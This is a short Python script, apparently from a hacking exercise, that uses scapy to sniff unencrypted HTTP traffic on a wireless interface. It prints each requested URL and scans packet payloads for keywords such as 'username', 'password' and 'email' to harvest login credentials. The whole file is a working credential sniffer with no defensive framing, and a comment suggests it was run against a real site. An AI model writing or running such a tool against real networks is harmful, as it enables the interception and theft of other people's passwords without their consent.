#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet,filter="port 80")


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords =["username", "user", "login", "password", "pass", "email", "useremail"]
        for keyword in keywords:
            if keyword in load:
                return load



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())#I used on Mysalon
        url=get_url(packet)
        print("[+]HTTP Request>>>" + str(url))

        login_info=get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username And Passwords" + login_info + "\n\n")


sniff("wlan0")